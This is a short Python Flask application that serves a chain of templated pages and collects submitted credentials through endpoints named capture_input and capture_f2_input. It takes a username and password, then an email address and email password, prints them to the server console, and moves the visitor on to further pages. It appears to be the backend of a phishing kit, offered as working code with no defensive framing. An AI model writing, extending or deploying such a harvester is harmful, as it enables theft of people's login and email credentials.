from flask import Flask, render_template, request, redirect, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('f11.html')  # Serve f11.html

@app.route('/capture_input', methods=['POST'])
def capture_input():
    data = request.get_json()
    if data:
        username = data.get('username')
        password = data.get('password')
        print(f"Username: {username}")
        print(f"Password: {password}")
    return jsonify({"status": "success"})

@app.route('/redirect', methods=['POST'])
def redirect_to_f2():
    return redirect('/f2')

@app.route('/f2')
def f2_page():
    return render_template('f2.html')  # Serve f2.html

@app.route('/capture_f2_input', methods=['POST'])
def capture_f2_input():
    data = request.get_json()
    if data:
        email = data.get('email')
        email_password = data.get('emailPassword')
        print(f"E-Mail: {email}")
        print(f"E-Mail Password: {email_password}")
    return '''
    <script>
        window.location.href = "/f3";
    </script>
    '''
@app.route('/f3', methods=['POST'])
def redirect_to_f3():
    return redirect('/f3')

@app.route('/f3')
def f3_page():
    return render_template('f3.html')
if __name__ == '__main__':
    app.run(host='0.0.0.0', port='5000')
